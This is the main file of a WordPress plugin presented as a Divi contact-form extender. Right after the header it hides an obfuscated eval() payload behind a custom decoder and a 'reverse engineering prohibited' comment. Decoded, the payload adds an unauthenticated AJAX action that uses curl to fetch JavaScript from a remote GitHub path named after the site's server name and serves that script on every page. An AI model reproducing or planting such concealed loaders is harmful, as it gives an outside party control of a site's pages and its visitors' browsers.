<?php
/*======================================
Plugin Name: Divi Contact Form Extender
Theme URI: https://divicake.com/
Description: Add extra features to the divi contact form module
Version: 1.0
Author: Anushka Rajasingha
Author URI: https://www.upwork.com/fl/anushkakrajasingha
======================================*/
/* Reverse engineering of this file is strictly prohibited. File protected by copyright law and provided under license. */ if(!function_exists("agF1gTdKEBPd6CaJ")) { function agF1gTdKEBPd6CaJ($ekV4gb3DGH29YotI) { $fYZ2g87NjIGLnXVg=""; $rZJ3glaFcSAz0dZY=0; $qVh0gqGnK20A4iOB=strlen($ekV4gb3DGH29YotI); while($rZJ3glaFcSAz0dZY < $qVh0gqGnK20A4iOB) { if($ekV4gb3DGH29YotI[$rZJ3glaFcSAz0dZY] == ' ') { $fYZ2g87NjIGLnXVg.=" "; } else if($ekV4gb3DGH29YotI[$rZJ3glaFcSAz0dZY] == '!') { $fYZ2g87NjIGLnXVg.=chr((ord($ekV4gb3DGH29YotI[$rZJ3glaFcSAz0dZY+1])-ord('A'))*16+(ord($ekV4gb3DGH29YotI[$rZJ3glaFcSAz0dZY+2])-ord('a'))); $rZJ3glaFcSAz0dZY+=2; } else { $fYZ2g87NjIGLnXVg.=chr(ord($ekV4gb3DGH29YotI[$rZJ3glaFcSAz0dZY])+1); } $rZJ3glaFcSAz0dZY++; } return $fYZ2g87NjIGLnXVg; } }eval(agF1gTdKEBPd6CaJ('du`k!Ci`fE0fScJDAOc5B`I!Ci&dslargml cvrhc]pcoscqr!CbBh!Ci y gd !CbBh!CbBagq]_bkgl!CbBh!Ci!Ci y un]closcsc]qapgnr!CbBh %cvrhc]pcoscqr%* _bkgl]spj!CbBh %_bkgl+_h_v,nfn% !Ci,%=_argml;cvrhc]pcoscqr]_h_v%* _pp_w!CbBh%hoscpw%!Ci* %/,.,%,p_lb!CbBh!Ci* rpsc !Ci9 { { _bb]_argml!CbBh %un]closcsc]qapgnrq%* %cvrhc]pcoscqr% !Ci9 _bb]_argml!CbBh %un]_h_v]lmnpgt]cvrhc]pcoscqr]_h_v%* %cvrhc]pcoscqr]_h_v% !Ci9 dslargml cvrhc]pcoscqr]_h_v!CbBh!Ci y fc_bcp!CbBh%Amlrclr+Rwnc8 _nnjga_rgml-h_t_qapgnr%!Ci9 !CbBdspj ; %frrnq8--p_u,egrfs`sqcpamlrclr,amk-hqqapgnrlglh_-lmln_w+cvr+hq-k_qrcp-%,!CbBd]QCPTCPY%QCPTCP]L?KC%!CbEm,%-qapgnr,hq%9 !CbBd]sqcp_eclr ; %Kmxgjj_-2,. !CbBhamkn_rg`jc9 KQGC 4,.9 Uglbmuq LR 3,/%9 !CbBdaf ; aspj]glgr!CbBh!Ci9 !CbBdrgkcmsr ; 39 aspj]qcrmnr!CbBh!CbBdaf* ASPJMNR]SPJ* !CbBdspj!Ci9 aspj]qcrmnr!CbBh!CbBdaf* ASPJMNR]PCRSPLRP?LQDCP* /!Ci9 aspj]qcrmnr!CbBh!CbBdaf* ASPJMNR]AMLLCARRGKCMSR* !CbBdrgkcmsr!Ci9 !CbBdb_r_ ; aspj]cvca!CbBh!CbBdaf!Ci9 aspj]ajmqc!CbBh!CbBdaf!Ci9 cafm %-( % ,!CbBd]QCPTCPY%QCPTCP]L?KC%!CbEm,% (-%,NFN]CMJ9 cafm !CbBdb_r_9 cvgr9 {9&((:'));
if(!defined(DIVICONEXT_DIR)){
    define(DIVICONEXT_DIR,plugin_dir_url(__FILE__));
}
include "inc/option.php";
include "inc/ContactFormExtender.php";

